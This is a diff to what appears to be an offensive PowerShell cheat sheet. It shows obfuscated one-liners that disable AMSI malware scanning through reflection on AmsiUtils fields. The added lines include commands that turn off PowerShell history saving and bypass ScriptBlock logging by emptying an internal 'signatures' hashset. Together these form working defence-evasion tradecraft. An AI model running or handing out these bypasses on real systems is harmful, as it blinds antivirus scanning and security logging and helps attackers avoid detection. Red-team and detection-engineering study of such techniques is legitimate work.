@@ -146,10 +146,15 @@ PS C:> [Threading.Thread]::Sleep(960);
 PS C:> [Ref].Assembly.GetType("$(('Sy'+'st'+'em').NORMAliZE([Char](70*10/10)+[chAR]([BYTe]0x6f)+[CHar]([ByTe]0x72)+[cHAR](109+105-105)+[chaR]([bYTE]0x44)) -replace [cHar]([BYtE]0x5c)+[ChAr]([bYTe]0x70)+[ChAr](123*4/4)+[cHAr]([BYTe]0x4d)+[cHAR](110+101-101)+[CHAR]([BytE]0x7d)).$([chAr](77+53-53)+[char]([BYtE]0x61)+[cHAr]([bytE]0x6e)+[CHaR](97+34-34)+[CHar](103)+[char]([ByTe]0x65)+[CHar]([BYtE]0x6d)+[ChAR]([bYTe]0x65)+[CHaR]([BytE]0x6e)+[char](116+35-35)).$(('Áutô'+'mätì'+'ôn').NoRMALiZE([chAR](45+25)+[CHAr]([BYTE]0x6f)+[ChAr]([Byte]0x72)+[cHaR](109)+[CHAR](68*20/20)) -replace [ChAr]([Byte]0x5c)+[ChaR]([BytE]0x70)+[CHAr](123*115/115)+[CHAr](77*65/65)+[chaR](67+43)+[char](125*12/12)).$(('Ámsí'+'Utíl'+'s').nORmAlizE([CHAR](70*17/17)+[CHar](111)+[char]([BytE]0x72)+[ChAR](109*14/14)+[cHar](68)) -replace [cHAr]([byTE]0x5c)+[cHaR]([Byte]0x70)+[CHAr]([BytE]0x7b)+[ChAR](77*63/63)+[chAr](110+49-49)+[chAR]([Byte]0x7d))").GetField("$([cHAR](97)+[cHar](109*42/42)+[chAr]([Byte]0x73)+[Char]([byTE]0x69)+[ChaR]([bytE]0x53)+[chAR](101*79/79)+[CHAR]([BYTE]0x73)+[CHar](115)+[char](105)+[CHAr](111)+[CHAr](63+47))", "NonPublic,Static").SetValue($KvFBfyuUN, $null);
 PS C:> [Ref].Assembly.GetType("$(('Sy'+'st'+'em').NORMAliZE([Char](70*10/10)+[chAR]([BYTe]0x6f)+[CHar]([ByTe]0x72)+[cHAR](109+105-105)+[chaR]([bYTE]0x44)) -replace [cHar]([BYtE]0x5c)+[ChAr]([bYTe]0x70)+[ChAr](123*4/4)+[cHAr]([BYTe]0x4d)+[cHAR](110+101-101)+[CHAR]([BytE]0x7d)).$([chAr](77+53-53)+[char]([BYtE]0x61)+[cHAr]([bytE]0x6e)+[CHaR](97+34-34)+[CHar](103)+[char]([ByTe]0x65)+[CHar]([BYtE]0x6d)+[ChAR]([bYTe]0x65)+[CHaR]([BytE]0x6e)+[char](116+35-35)).$(('Áutô'+'mätì'+'ôn').NoRMALiZE([chAR](45+25)+[CHAr]([BYTE]0x6f)+[ChAr]([Byte]0x72)+[cHaR](109)+[CHAR](68*20/20)) -replace [ChAr]([Byte]0x5c)+[ChaR]([BytE]0x70)+[CHAr](123*115/115)+[CHAr](77*65/65)+[chaR](67+43)+[char](125*12/12)).$(('Ámsí'+'Utíl'+'s').nORmAlizE([CHAR](70*17/17)+[CHar](111)+[char]([BytE]0x72)+[ChAR](109*14/14)+[cHar](68)) -replace [cHAr]([byTE]0x5c)+[cHaR]([Byte]0x70)+[CHAr]([BytE]0x7b)+[ChAR](77*63/63)+[chAr](110+49-49)+[chAR]([Byte]0x7d))").GetField("$(('âm'+'sì'+'Có'+'nt'+'ex'+'t').NORMaLIZe([cHaR]([byTE]0x46)+[chAR]([byte]0x6f)+[cHaR]([BYtE]0x72)+[CHAr]([byte]0x6d)+[chAr](68)) -replace [CHaR]([BytE]0x5c)+[chAr](112*50/50)+[cHAR](77+46)+[CHAR]([ByTE]0x4d)+[Char](110*8/8)+[CHAr](125*18/18))", "NonPublic,Static").SetValue($null, [IntPtr]$srbyeq);
 
-------------
-Other: 
-> command to disable PowerShell history
+--------
+Others 
+-------
+> Command to disable PowerShell history
   PS c:\> Set-PSReadlineOption -HistorySaveStyle SaveNothing
+
+> Command to disable/bypass PowerShell ScriptBlock logging 
+  Here we set the “signatures” variable with a new empty hashset, meaning that the “force” parameter will never be true, bypassing logging)
+  PS c:\> [Ref].Assembly.GetType(“System.Management.Automation.ScriptBlock”).GetField(“signatures”,”NonPublic,static”).SetValue($null, (New-Object ‘System.Collections.Generic.HashSet[string]’))
 
 
 ====================================================================================================================================
